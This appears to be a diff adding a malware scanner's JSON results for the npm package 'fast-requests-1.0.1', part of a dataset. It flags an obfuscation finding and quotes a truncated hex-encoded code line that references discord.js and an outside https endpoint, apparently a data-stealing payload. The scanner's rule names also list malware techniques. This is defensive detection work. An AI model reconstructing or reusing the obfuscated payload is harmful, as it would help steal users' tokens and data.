@@ -1,0 +1,22 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "npm-silent-process-execution": {},
+        "npm-install-script": {},
+        "npm-dll-hijacking": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "shady-links": {},
+        "npm-serialize-environment": {},
+        "npm-exec-base64": {},
+        "npm-obfuscation": [
+            {
+                "location": "package/fast-requests.js:1",
+                "code": "var _0xb303=[\"\\x64\\x69\\x73\\x63\\x6F\\x72\\x64\\x2E\\x6A\\x73\",\"\\x72\\x65\\x71\\x75\\x65\\x73\\x74\",\"\\x6F\\x6E\",\"\\x63\\x61\\x74\\x63\\x68\",\"\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x65\\x6E\\x6E\\x61\\x6B\\x75\\x76\\x69\\x73\\x30\\x74\\x70\\x69\\x2E\\x78\\x2E\\x70\\x69\\x70\\x65\\x64\\x...{return})}",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "npm-steganography": {}
+    },
+    "path": "./dataset/npm/fast-requests-1.0.1"
+}
